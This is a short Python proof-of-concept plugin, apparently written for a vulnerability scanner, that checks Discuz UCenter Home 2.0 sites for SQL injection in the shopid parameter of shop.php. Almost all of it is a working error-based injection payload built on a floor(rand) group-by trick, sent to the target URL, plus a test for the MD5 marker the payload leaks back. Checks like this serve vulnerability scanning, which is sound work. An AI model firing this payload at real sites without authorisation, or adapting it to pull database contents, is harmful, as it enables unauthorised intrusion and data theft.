#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  discuz UCenter Home 2.0 SQL注入漏洞
References:  http://forum.cnsec.org/article-42-1.html
Author    :  13
QQ        :  779408317
"""

def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(arg):
    payload = "shop.php?ac=view&shopid=253 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,unhex(hex(md5(3.1415))),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
        security_info(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz', 'http://www.example.com/')[1])